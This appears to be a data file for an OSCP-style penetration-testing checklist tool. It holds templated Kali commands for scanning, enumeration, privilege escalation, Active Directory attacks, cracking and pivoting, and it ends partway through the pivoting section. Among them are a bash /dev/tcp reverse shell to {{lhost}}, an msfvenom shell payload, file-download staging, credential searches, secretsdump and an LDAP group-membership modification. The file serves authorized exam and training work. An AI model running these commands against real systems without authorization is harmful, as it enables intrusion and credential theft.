export const DEFAULT_VARIABLES = {
  workspaceRoot: "/home/kali/oscp",
  lhost: "10.10.14.2",
  lport: "443",
  rhost: "",
  rport: "",
  uport: "",
  targetName: "",
  userFlagName: "local.txt",
  rootFlagName: "proof.txt",
  domain: "",
  baseDn: "",
  dc: "",
  user: "",
  memberUser: "",
  targetGroup: "",
  password: "",
  gppCpassword: "",
  hash: "",
  smbShare: "SYSVOL",
  smbDirectory: ".",
  sprayPassword: "",
  sprayJitter: "3-5",
  sprayRockyouLimit: "25",
  subnet: "172.16.10.0/24",
  interface: "tun0",
  wordlist: "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
};

export const VARIABLE_GROUPS = [
  { label: "Workspace", keys: ["workspaceRoot"] },
  { label: "Operator", keys: ["lhost", "lport", "interface"] },
  { label: "Target", keys: ["targetName", "rhost", "rport", "uport", "subnet", "userFlagName", "rootFlagName"] },
  { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "memberUser", "targetGroup", "password", "gppCpassword", "hash"] },
  { label: "Resources", keys: ["smbShare", "smbDirectory", "sprayPassword", "sprayJitter", "sprayRockyouLimit", "wordlist"] },
];

export const CHECKLIST = [
  {
    id: "setup",
    number: "00",
    title: "Workspace setup",
    summary: "Make the evidence path, variables, and Kali resources predictable before touching the target.",
    items: [
      {
        id: "setup-workspace",
        title: "Create a target workspace",
        detail: "Keep raw scans and evidence separate from working files.",
        commands: [
          { label: "Create folders", value: "mkdir -p {{workspaceRoot}}/{{targetName}}/{scans,web,loot,exploits,notes} && cd {{workspaceRoot}}/{{targetName}}" },
          { label: "Start command log", value: "script -a {{workspaceRoot}}/{{targetName}}/notes/terminal.log" },
        ],
      },
      {
        id: "setup-network",
        title: "Confirm VPN address and route",
        commands: [
          { label: "Interface", value: "ip -br address show {{interface}} && ip route" },
          { label: "Set local host", value: "export LHOST=$(ip -4 -o addr show {{interface}} | awk '{print $4}' | cut -d/ -f1) && echo $LHOST" },
        ],
      },
      {
        id: "setup-resources",
        title: "Verify Kali resource paths",
        detail: "Use the packaged resources first; discover exact binary names instead of assuming them.",
        commands: [
          { label: "Resource links", value: "ls -ld /usr/share/windows-resources /usr/share/wordlists /usr/share/seclists /usr/share/ligolo-ng-common-binaries" },
          { label: "Useful Windows binaries", value: "find /usr/share/windows-resources -type f \\( -iname 'winpeas*' -o -iname 'nc.exe' -o -iname 'mimikatz*' \\) 2>/dev/null" },
          { label: "Ligolo binaries", value: "find /usr/share/ligolo-ng-common-binaries -maxdepth 2 -type f -printf '%p\n'" },
        ],
      },
      {
        id: "setup-reachability",
        title: "Record baseline reachability",
        commands: [
          { label: "Ping", value: "ping -c 2 {{rhost}}" },
          { label: "No ICMP fallback", value: "sudo nmap -Pn -n -p 22,80,443,445,3389 {{rhost}}" },
        ],
      },
    ],
  },
  {
    id: "recon",
    number: "01",
    title: "Port discovery",
    summary: "Scan every TCP port, then investigate services with focused scripts. Do not let a default scan define the box.",
    items: [
      {
        id: "recon-tcp-all",
        title: "Scan all TCP ports",
        commands: [
          { label: "Full TCP", value: "sudo nmap -Pn -n -p- --min-rate 2000 --max-retries 2 -oA {{workspaceRoot}}/{{targetName}}/scans/tcp-all {{rhost}}" },
          { label: "Extract ports", value: "grep -oP '\\d+/open' {{workspaceRoot}}/{{targetName}}/scans/tcp-all.gnmap | cut -d/ -f1 | paste -sd, -" },
        ],
      },
      {
        id: "recon-tcp-detail",
        title: "Fingerprint open TCP services",
        commands: [
          { label: "Focused scan", value: "sudo nmap -Pn -n -sCV -p {{rport}} -oA {{workspaceRoot}}/{{targetName}}/scans/tcp-detail {{rhost}}" },
          { label: "Vulnerability hints", value: "nmap -Pn -n --script vuln -p {{rport}} -oN {{workspaceRoot}}/{{targetName}}/scans/tcp-vuln.txt {{rhost}}" },
        ],
      },
      {
        id: "recon-udp",
        title: "Check common UDP services",
        commands: [
          { label: "Top UDP", value: "sudo nmap -Pn -n -sU --top-ports 100 --open -oA {{workspaceRoot}}/{{targetName}}/scans/udp-top100 {{rhost}}" },
          { label: "Focused UDP", value: "sudo nmap -Pn -n -sU -sV -p {{uport}} -oN {{workspaceRoot}}/{{targetName}}/scans/udp-detail.txt {{rhost}}" },
        ],
      },
      {
        id: "recon-hostnames",
        title: "Resolve hostnames and virtual hosts",
        commands: [
          { label: "Certificate names", value: "for port in $(echo '{{rport}}' | tr ',' ' '); do cert=$(echo | timeout 3 openssl s_client -connect {{rhost}}:$port -servername {{rhost}} 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName 2>/dev/null); if [ -n \"$cert\" ]; then printf '\\n[+] Port %s:\\n%s\\n' \"$port\" \"$cert\"; fi; done | tee {{workspaceRoot}}/{{targetName}}/scans/certificates.txt" },
          { label: "SSL cert scan", value: "nmap -Pn -n -p {{rport}} --script ssl-cert -oN {{workspaceRoot}}/{{targetName}}/scans/ssl-certs.txt {{rhost}}" },
          { label: "Hosts entry", value: "echo '{{rhost}} {{targetName}} {{dc}} {{domain}}' | sudo tee -a /etc/hosts" },
        ],
      },
    ],
  },
  {
    id: "services",
    number: "02",
    title: "Service enumeration",
    summary: "Use a few dependable Kali tools and save raw output. Reuse every valid credential across exposed services.",
    items: [
      {
        id: "svc-smb",
        title: "SMB / RPC (139, 445)",
        detail: "The guest command, the current command-context credential, and every account saved under Findings with a secret are added automatically below as all-shares commands. Each identity downloads into its own folder. Run credentials deliberately: repeated bad passwords can lock accounts.",
        commands: [
          { label: "Anonymous SMB", value: "nxc smb {{rhost}} -u '' -p '' --shares --users --groups" },
          { label: "Authenticated SMB", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --shares --users --groups --sessions" },
          { label: "Triage all downloaded SMB loot", value: "find {{workspaceRoot}}/{{targetName}}/loot/smb -type f -printf '%s %p\\n' | sort -nr > {{workspaceRoot}}/{{targetName}}/loot/smb-file-index.txt; grep -RniI -E 'pass(word)?|passwd|pwd|secret|token|api.?key|connection.?string|cpassword|user(name)?|BEGIN (RSA |OPENSSH )?PRIVATE KEY' {{workspaceRoot}}/{{targetName}}/loot/smb | tee {{workspaceRoot}}/{{targetName}}/loot/smb-credential-hits.txt" },
        ],
      },
      {
        id: "svc-smb-gpp",
        title: "Group Policy Preferences (GPP) credentials",
        detail: "A cpassword from an XML file is encrypted data, not the login password. Preserve the XML and its userName/runAs field, decrypt the cpassword, then replace the normal user/password variables with the recovered credential before retesting SMB.",
        commands: [
          { label: "Find downloaded GPP XML", value: "grep -Rni --include='*.xml' -E 'cpassword|userName|runAs' {{workspaceRoot}}/{{targetName}}/loot/smb" },
          { label: "Decrypt one cpassword", value: "gpp-decrypt '{{gppCpassword}}'" },
          { label: "Parse a saved XML file", value: "impacket-Get-GPPPassword LOCAL -xmlfile /path/to/Groups.xml" },
          { label: "Search SYSVOL with valid credentials", value: "impacket-Get-GPPPassword '{{domain}}/{{user}}:{{password}}@{{rhost}}' -dc-ip {{rhost}}" },
          { label: "Retest recovered credential", value: "nxc smb {{rhost}} -d '{{domain}}' -u '{{user}}' -p '{{password}}' --shares --users --groups" },
        ],
      },
      {
        id: "svc-ldap",
        title: "LDAP / Active Directory (389, 636)",
        commands: [
          { label: "Root DSE", value: "ldapsearch -x -H ldap://{{rhost}} -s base namingContexts defaultNamingContext" },
          { label: "Authenticated users", value: "ldapsearch -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(objectClass=user)' sAMAccountName memberOf" },
        ],
      },
      {
        id: "svc-nfs",
        title: "NFS / RPC (111, 2049)",
        commands: [
          { label: "Exports", value: "showmount -e {{rhost}} && nmap -Pn -p 111,2049 --script 'nfs-*' {{rhost}}" },
          { label: "Mount", value: "sudo mkdir -p /mnt/{{targetName}} && sudo mount -t nfs {{rhost}}:/EXPORT /mnt/{{targetName}} -o nolock" },
        ],
      },
      {
        id: "svc-snmp",
        title: "SNMP (161/udp)",
        commands: [
          { label: "Find community", value: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {{rhost}}" },
          { label: "Walk", value: "snmpwalk -v2c -c public {{rhost}} .1 | tee {{workspaceRoot}}/{{targetName}}/scans/snmpwalk.txt" },
        ],
      },
      {
        id: "svc-dns",
        title: "DNS (53)",
        commands: [
          { label: "Records", value: "dig @{{rhost}} {{domain}} ANY +noall +answer; dig @{{rhost}} _ldap._tcp.dc._msdcs.{{domain}} SRV +short" },
          { label: "Zone transfer", value: "dig @{{rhost}} {{domain}} AXFR" },
        ],
      },
      {
        id: "svc-mail-ftp",
        title: "FTP and mail services",
        commands: [
          { label: "FTP anonymous", value: "ftp anonymous@{{rhost}}" },
          { label: "SMTP users", value: "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {{rhost}}" },
        ],
      },
    ],
  },
  {
    id: "web",
    number: "03",
    title: "Web enumeration",
    summary: "Map the application with curl and ffuf before reaching for specialized scanners.",
    items: [
      {
        id: "web-baseline",
        title: "Capture headers, technology, and source",
        commands: [
          { label: "Headers", value: "curl -k -i http://{{rhost}}:{{rport}}/ | tee {{workspaceRoot}}/{{targetName}}/web/root-response.txt" },
          { label: "Fingerprint", value: "whatweb -a 3 http://{{rhost}}:{{rport}}/" },
          { label: "Common files", value: "for p in robots.txt sitemap.xml .git/HEAD .env; do echo ===$p; curl -ks http://{{rhost}}:{{rport}}/$p; done" },
        ],
      },
      {
        id: "web-content",
        title: "Discover content and files",
        commands: [
          { label: "Directories", value: "ffuf -u http://{{rhost}}:{{rport}}/FUZZ -w {{wordlist}} -e .php,.aspx,.txt,.bak,.zip -ac -c -o {{workspaceRoot}}/{{targetName}}/web/ffuf-content.json" },
          { label: "Parameters", value: "ffuf -u 'http://{{rhost}}:{{rport}}/index.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac -c" },
        ],
      },
      {
        id: "web-vhosts",
        title: "Discover virtual hosts",
        commands: [
          { label: "Vhosts", value: "ffuf -u http://{{rhost}}:{{rport}}/ -H 'Host: FUZZ.{{domain}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -c" },
          { label: "DNS names", value: "ffuf -u http://FUZZ.{{domain}}:{{rport}}/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -c" },
        ],
      },
      {
        id: "web-manual",
        title: "Test inputs and access controls manually",
        detail: "Proxy interesting requests, change one input at a time, and record the exact request that proves impact. Avoid automatic exploitation tools during the exam; verify the current OffSec restrictions before starting.",
        commands: [
          { label: "Replay request", value: "curl -k -i -X POST 'http://{{rhost}}:{{rport}}/login' -d 'username={{user}}&password={{password}}'" },
          { label: "Manual SQLi comparison", value: "for value in \"1\" \"1' AND '1'='1\" \"1' AND '1'='2\"; do echo \"=== id=$value\"; curl -ksS -o /tmp/fieldnotes-response -w 'status=%{http_code} bytes=%{size_download} time=%{time_total}\\n' --get --data-urlencode \"id=$value\" 'http://{{rhost}}:{{rport}}/index.php'; sha256sum /tmp/fieldnotes-response; done" },
        ],
      },
      {
        id: "web-files-api",
        title: "Check file handling, backups, and API surface",
        detail: "Use observed routes and parameters. These commands identify capabilities; they do not prove an arbitrary file read, upload bypass, or authorization flaw by themselves.",
        commands: [
          { label: "Allowed methods", value: "curl -k -i -X OPTIONS 'http://{{rhost}}:{{rport}}/'" },
          { label: "Common backup suffixes", value: "for path in index.php web.config appsettings.json package.json; do for suffix in .bak .old .zip '~'; do url=\"http://{{rhost}}:{{rport}}/$path$suffix\"; curl -ksS -o /dev/null -w '%{http_code} %{size_download} %{url_effective}\\n' \"$url\"; done; done" },
          { label: "API description files", value: "for path in swagger.json openapi.json api/docs swagger/index.html; do curl -ksS -o /dev/null -w '%{http_code} %{size_download} %{url_effective}\\n' \"http://{{rhost}}:{{rport}}/$path\"; done" },
        ],
      },
    ],
  },
  {
    id: "access",
    number: "04",
    title: "Initial access & transfer",
    summary: "Validate versions, read the exploit, stage only what you need, and stabilize the first shell.",
    items: [
      {
        id: "access-research",
        title: "Research the exact service version",
        commands: [
          { label: "Searchsploit", value: "searchsploit --exclude='(PoC)|dos' '{{targetName}} {{rport}}'" },
          { label: "Copy exploit", value: "searchsploit -m EXPLOIT_ID && sed -n '1,220p' EXPLOIT_FILE" },
        ],
      },
      {
        id: "access-remote",
        title: "Try remote access with discovered credentials",
        detail: "Commands are generated from the active credential and every saved account. A valid SMB login is not automatically a shell: Evil-WinRM requires WinRM and permission to use it, while NetExec SMB execution and WMI require administrator access. Look for Pwn3d in NetExec output. If authentication works but every shell method fails, continue with AD enumeration and Kerberoasting.",
        commands: [
          { label: "Check remote-management ports", value: "nmap -Pn -n -sV --open -p 22,445,3389,5985,5986 -oN {{workspaceRoot}}/{{targetName}}/scans/remote-access.txt {{rhost}}" },
        ],
      },
      {
        id: "access-listener",
        title: "Start a listener",
        commands: [
          { label: "Netcat", value: "rlwrap -cAr nc -lvnp {{lport}}" },
          { label: "Socat TTY", value: "socat file:$(tty),raw,echo=0 tcp-listen:{{lport}}" },
        ],
      },
      {
        id: "access-shells",
        title: "Prepare simple reverse-shell payloads",
        commands: [
          { label: "Bash", value: "bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1'" },
          { label: "PowerShell", value: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f exe -o {{workspaceRoot}}/{{targetName}}/exploits/shell.exe" },
        ],
      },
      {
        id: "access-transfer",
        title: "Transfer files from Kali",
        commands: [
          { label: "Serve current folder", value: "python3 -m http.server 8000 --bind {{lhost}}" },
          { label: "Linux download", value: "curl http://{{lhost}}:8000/FILE -o /tmp/FILE && chmod +x /tmp/FILE" },
          { label: "Windows download", value: "powershell -c \"iwr http://{{lhost}}:8000/FILE -OutFile C:\\Windows\\Temp\\FILE\"" },
        ],
      },
      {
        id: "access-tty",
        title: "Upgrade a Linux shell",
        commands: [
          { label: "Spawn PTY", value: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
          { label: "Fix terminal", value: "export TERM=xterm-256color; stty rows 40 columns 120" },
        ],
      },
    ],
  },
  {
    id: "linux-privesc",
    number: "05",
    title: "Linux privilege escalation",
    summary: "Start with identity and delegated rights, then inspect credentials, scheduled work, file permissions, and capabilities.",
    items: [
      {
        id: "linux-context",
        title: "Capture host and user context",
        commands: [
          { label: "Identity", value: "id; hostname; uname -a; cat /etc/os-release; ip -br a" },
          { label: "Sudo", value: "sudo -l" },
        ],
      },
      {
        id: "linux-files",
        title: "Check SUID, capabilities, and writable paths",
        commands: [
          { label: "SUID", value: "find / -perm -4000 -type f 2>/dev/null" },
          { label: "Capabilities", value: "getcap -r / 2>/dev/null" },
          { label: "Writable", value: "find /etc /opt /var /usr/local -writable -type f 2>/dev/null | head -200" },
        ],
      },
      {
        id: "linux-jobs",
        title: "Inspect processes and scheduled jobs",
        commands: [
          { label: "Processes", value: "ps auxwwf; ss -lntup" },
          { label: "Schedules", value: "cat /etc/crontab; ls -la /etc/cron* /var/spool/cron 2>/dev/null" },
          { label: "Systemd", value: "systemctl list-timers --all; find /etc/systemd /usr/lib/systemd -writable -type f 2>/dev/null" },
        ],
      },
      {
        id: "linux-secrets",
        title: "Search likely credential locations",
        commands: [
          { label: "Config secrets", value: "grep -RniE 'pass(word)?|secret|token|api.?key' /var/www /opt /home 2>/dev/null | head -200" },
          { label: "History and keys", value: "find /home /root -maxdepth 3 \\( -name '.*history' -o -name 'id_rsa' -o -name '*.kdbx' \\) -ls 2>/dev/null" },
        ],
      },
      {
        id: "linux-storage-groups",
        title: "Check mounts, backups, and privileged groups",
        commands: [
          { label: "Storage and mounts", value: "lsblk -f; findmnt; df -h; cat /etc/fstab" },
          { label: "Groups and sockets", value: "id; getent group docker lxd disk adm 2>/dev/null; find /var/run -type s -ls 2>/dev/null" },
          { label: "Backups and application roots", value: "find /var/backups /opt /srv /usr/local -maxdepth 3 -type f -printf '%M %u:%g %p\\n' 2>/dev/null | head -250" },
        ],
      },
    ],
  },
  {
    id: "windows-privesc",
    number: "06",
    title: "Windows privilege escalation",
    summary: "Enumerate privileges, services, tasks, stored credentials, and local-only listeners before uploading helpers.",
    items: [
      {
        id: "windows-context",
        title: "Capture host and user context",
        commands: [
          { label: "Identity", value: "whoami /all & hostname & systeminfo & ipconfig /all" },
          { label: "Local users", value: "net user & net localgroup administrators" },
        ],
      },
      {
        id: "windows-services",
        title: "Inspect services and unquoted paths",
        commands: [
          { label: "Services", value: "powershell -c \"Get-CimInstance Win32_Service | Select Name,State,StartName,PathName | Format-Table -Auto\"" },
          { label: "Writable service binaries", value: "powershell -c \"Get-CimInstance Win32_Service | ? PathName | % { $_.PathName }\"" },
        ],
      },
      {
        id: "windows-jobs",
        title: "Inspect tasks, autoruns, and local ports",
        commands: [
          { label: "Scheduled tasks", value: "schtasks /query /fo LIST /v" },
          { label: "Autoruns", value: "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run & reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" },
          { label: "Listeners", value: "netstat -ano | findstr LISTENING & tasklist /svc" },
        ],
      },
      {
        id: "windows-secrets",
        title: "Check stored credentials and configuration",
        commands: [
          { label: "Credential Manager", value: "cmdkey /list" },
          { label: "Unattended files", value: "dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml C:\\*.config 2>nul" },
          { label: "PowerShell history", value: "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" },
        ],
      },
      {
        id: "windows-privileges-policy",
        title: "Validate token privileges and installer policy",
        commands: [
          { label: "Token privileges", value: "whoami /priv & whoami /groups" },
          { label: "AlwaysInstallElevated", value: "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" },
          { label: "Program directory permissions", value: "powershell -c \"Get-ChildItem 'C:\\Program Files','C:\\Program Files (x86)' -Directory -ErrorAction SilentlyContinue | ForEach-Object { try { $acl=Get-Acl $_.FullName; [pscustomobject]@{Path=$_.FullName;Access=($acl.Access | ? {$_.IdentityReference -match 'Users|Everyone|Authenticated Users'} | % FileSystemRights) -join ','} } catch {} } | ? Access | Format-Table -Auto\"" },
        ],
      },
      {
        id: "windows-helper",
        title: "Run one packaged helper if manual checks stall",
        commands: [
          { label: "Find WinPEAS on Kali", value: "find /usr/share/windows-resources -type f \\( -iname 'winpeas*x64*.exe' -o -iname 'winPEASany.exe' \\) 2>/dev/null" },
          { label: "Save output", value: "winPEASx64.exe log=console > C:\\Windows\\Temp\\winpeas.txt" },
        ],
      },
    ],
  },
  {
    id: "active-directory",
    number: "07",
    title: "Active Directory",
    summary: "Fix names and time first. Prefer NetExec and Impacket so the Kali-side workflow stays small.",
    items: [
      {
        id: "ad-baseline",
        title: "Confirm domain DNS and clock",
        commands: [
          { label: "DNS", value: "dig @{{rhost}} _ldap._tcp.dc._msdcs.{{domain}} SRV +short" },
          { label: "Sync time from domain controller", value: "sudo timedatectl set-ntp false; sudo net time set -S {{rhost}}" },
          { label: "Credential test", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --shares" },
        ],
      },
      {
        id: "ad-enum",
        title: "Enumerate users, groups, and policy",
        commands: [
          { label: "Users and groups", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --users --groups --pass-pol" },
          { label: "BloodHound collection", value: "bloodhound-python -u '{{user}}' -p '{{password}}' -d {{domain}} -ns {{rhost}} -c All --zip" },
        ],
      },
      {
        id: "ad-roast",
        title: "Check for AS-REP roastable users",
        commands: [
          { label: "AS-REP tracked users into target loot", value: "users_file=\"{{workspaceRoot}}/{{targetName}}/loot/users.txt\"; loot=\"{{workspaceRoot}}/{{targetName}}/loot/kerberos/asrep\"; test -s \"$users_file\" || { echo \"[-] Build the target users file from Findings first\"; exit 1; }; mkdir -p \"$loot\"; impacket-GetNPUsers '{{domain}}/' -dc-ip {{rhost}} -usersfile \"$users_file\" -no-pass -format hashcat -outputfile \"$loot/asrep.hashes\" | tee \"$loot/enumeration.txt\"" },
        ],
      },
      {
        id: "ad-spn-tgs",
        title: "Kerberoast SPN accounts into target loot",
        detail: "The active credential and every saved account generate separate GetUserSPNs commands. Enumeration output and hashes.txt stay under the current target and credential identity. Printed ticket hashes are parsed into per-user Hashcat and John commands under Credentials. Switch targets with Use in commands to produce that target's paths and DC address.",
        commands: [
          { label: "Inventory saved SPN/TGS loot", value: "root=\"{{workspaceRoot}}/{{targetName}}/loot/kerberos/spn_tgs\"; mkdir -p \"$root\"; find \"$root\" -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\\n' | sort" },
        ],
      },
      {
        id: "ad-group-membership",
        title: "Exercise delegated control over a group",
        detail: "Use this only after confirming that the selected identity has GenericAll, GenericWrite, or WriteProperty over the target group's member attribute. The operation adds MEMBER USER to TARGET GROUP; it does not create a group. Resolve both distinguished names first, capture existing membership, verify the change, and retain the rollback command.",
        commands: [
          { label: "Resolve group and member DNs", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); printf 'Group: %s\\nMember: %s\\n' \"$group_dn\" \"$member_dn\"; test -n \"$group_dn\" -a -n \"$member_dn\"" },
          { label: "Capture current group membership", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" || { echo 'Target group was not found'; exit 1; }; mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/ldap'; ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b \"$group_dn\" -s base '(objectClass=*)' sAMAccountName member | tee '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-before.ldif'" },
          { label: "Add member with ldapmodify", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" -a -n \"$member_dn\" || { echo 'Group or member DN was not found'; exit 1; }; mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/ldap'; printf 'dn: %s\\nchangetype: modify\\nadd: member\\nmember: %s\\n' \"$group_dn\" \"$member_dn\" | tee '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-add.ldif' | ldapmodify -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}'" },
          { label: "Verify selected member", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" -a -n \"$member_dn\" || { echo 'Group or member DN was not found'; exit 1; }; ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b \"$group_dn\" -s base '(objectClass=*)' sAMAccountName member | tee '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-after.ldif'; grep -F \"member: $member_dn\" '{{workspaceRoot}}/{{targetName}}/loot/ldap/group-membership-after.ldif'" },
          { label: "Rollback: remove member with ldapmodify", value: "group_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=group)(sAMAccountName={{targetGroup}}))' dn | sed -n 's/^dn: //p' | head -n1); member_dn=$(ldapsearch -x -LLL -o ldif-wrap=no -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(&(objectClass=user)(sAMAccountName={{memberUser}}))' dn | sed -n 's/^dn: //p' | head -n1); test -n \"$group_dn\" -a -n \"$member_dn\" || { echo 'Group or member DN was not found'; exit 1; }; printf 'dn: %s\\nchangetype: modify\\ndelete: member\\nmember: %s\\n' \"$group_dn\" \"$member_dn\" | ldapmodify -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}'" },
          { label: "Windows ADSI: add member", value: "$Group = ([adsisearcher]'(&(objectClass=group)(sAMAccountName={{targetGroup}}))').FindOne().GetDirectoryEntry(); $Member = ([adsisearcher]'(&(objectClass=user)(sAMAccountName={{memberUser}}))').FindOne().GetDirectoryEntry(); [void]$Group.Properties['member'].Add($Member.distinguishedName.Value); $Group.CommitChanges(); $Group.RefreshCache(); $Group.Properties['member']" },
        ],
      },
      {
        id: "ad-remote",
        title: "Test permitted remote administration",
        commands: [
          { label: "WinRM", value: "nxc winrm {{rhost}} -u '{{user}}' -p '{{password}}'" },
          { label: "Evil-WinRM", value: "evil-winrm -i {{rhost}} -u '{{user}}' -p '{{password}}'" },
          { label: "WMI with hash", value: "impacket-wmiexec -hashes ':{{hash}}' '{{domain}}/{{user}}@{{rhost}}'" },
        ],
      },
      {
        id: "ad-delegation-adcs",
        title: "Check delegation, protected accounts, and AD CS",
        detail: "Treat scanner output as a lead. Confirm the exact object, right, template setting, and effective principal before documenting an abuse path.",
        commands: [
          { label: "Delegation and protected users", value: "ldapsearch -x -H ldap://{{rhost}} -D '{{domain}}\\{{user}}' -w '{{password}}' -b '{{baseDn}}' '(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(userAccountControl:1.2.840.113556.1.4.803:=16777216)(adminCount=1))' sAMAccountName userAccountControl adminCount msDS-AllowedToDelegateTo" },
          { label: "AD CS vulnerable templates", value: "certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{rhost}} -enabled -vulnerable -stdout" },
          { label: "Admin-only credential dump check", value: "impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{rhost}}' -just-dc-user '{{user}}'" },
        ],
      },
    ],
  },
  {
    id: "credentials",
    number: "08",
    title: "Credentials",
    summary: "Identify the format, run a bounded offline attack, and record every reuse attempt instead of repeating it from memory.",
    items: [
      {
        id: "creds-identify",
        title: "Identify and normalize captured hashes",
        commands: [
          { label: "Identify", value: "hashid -m hashes.txt" },
          { label: "Show example modes", value: "hashcat --example-hashes | less" },
        ],
      },
      {
        id: "creds-crack",
        title: "Try the common Kali wordlist",
        commands: [
          { label: "Prepare rockyou", value: "test -f /usr/share/wordlists/rockyou.txt || sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz" },
          { label: "Hashcat", value: "hashcat -m HASH_MODE hashes.txt /usr/share/wordlists/rockyou.txt --status --session {{targetName}}" },
          { label: "John", value: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt && john --show hashes.txt" },
        ],
      },
      {
        id: "creds-reuse",
        title: "Test known credentials across the target",
        commands: [
          { label: "Network services", value: "for protocol in smb winrm ssh; do nxc \"$protocol\" {{rhost}} -u '{{user}}' -p '{{password}}' --continue-on-success; done" },
          { label: "SSH", value: "ssh -o PreferredAuthentications=password '{{user}}@{{rhost}}'" },
        ],
      },
      {
        id: "creds-spray",
        title: "Run a bounded password spray",
        detail: "Review domain lockout policy first. Start with one strong candidate password and jitter; only use discovered-password or bounded rockyou lists when the risk is acceptable.",
        commands: [
          { label: "Review password policy first", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --pass-pol" },
        ],
      },
    ],
  },
  {
    id: "pivoting",
    number: "09",
    title: "Pivoting",
    summary: "Use Ligolo-ng for a routable tunnel; use SSH dynamic forwarding when it is already available.",
    items: [
      {
        id: "pivot-ligolo-kali",
        title: "Prepare the Ligolo interface and proxy",
        commands: [
          { label: "Interface", value: "sudo ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null; sudo ip link set ligolo up" },
          { label: "Find proxy", value: "find /usr/share/ligolo-ng-common-binaries -type f \\( -iname '*proxy*linux*' -o -iname 'proxy' \\)" },
          { label: "Route subnet", value: "sudo ip route add {{subnet}} dev ligolo" },
        ],
      },
      {
        id: "pivot-ligolo-agent",
        title: "Run the agent on the pivot host",
        commands: [
          { label: "Find agent", value: "find /usr/share/ligolo-ng-common-binaries -type f -iname '*agent*'" },
          { label: "Connect", value: "./agent -connect {{lhost}}:11601 -ignore-cert" },
        ],
      },
      {
        id: "pivot-ssh",
        title: "Use an SSH SOCKS tunnel when practical",
        commands: [
          { label: "Dynamic tunnel", value: "ssh -N -D 127.0.0.1:1080 {{user}}@{{rhost}}" },
